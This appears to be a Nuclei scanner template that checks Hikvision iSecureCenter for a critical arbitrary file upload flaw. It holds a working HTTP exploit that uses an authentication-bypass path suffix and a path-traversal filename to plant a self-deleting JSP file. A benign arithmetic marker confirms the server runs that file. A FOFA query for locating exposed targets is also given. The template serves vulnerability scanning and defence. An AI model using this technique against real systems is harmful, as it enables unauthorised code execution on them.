http:
- matchers:
  - part: body
    type: word
    words:
    - '246908642'
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - "POST /center/api/files;.js HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0\
    \ (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0\
    \ Safari/537.36 Trailer/99.3.7322.23\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\n\
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\n\
    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryOKldnDPT\nUpgrade-Insecure-Requests:\
    \ 1\nConnection: close\n\n------WebKitFormBoundaryOKldnDPT\nContent-Disposition:\
    \ form-data; name=\"file\"; filename=\"../../../../../bin/tomcat/apache-tomcat/webapps/clusterMgr/{{filename}}\"\
    \ \nContent-Type: application/octet-stream\n\n<% out.print(11111*22222);new java.io.File(application.getRealPath(request.getServletPath())).delete();\
    \ %>\n------WebKitFormBoundaryOKldnDPT--\n"
  - 'GET /clusterMgr/{{filename}};js HTTP/1.1

    Host: {{Hostname}}

    '
id: hikvision-iSecureCenter-upload
info:
  author: Co5mos
  description: An arbitrary file upload vulnerability in the Hikvision iSecureCenter.
  metadata:
    fofa-query: app="HIKVISION-iSecure-Center"
    max-request: 2
    verified: true
  name: Hikvision iSecureCenter - Arbitrary File Upload
  reference:
  - https://github.com/Sweelg/HIKVISION_iSecure_Center-RCE
  severity: critical
  tags: hikvision,fileupload
variables:
  filename: '{{rand_base(6)}}.jsp'
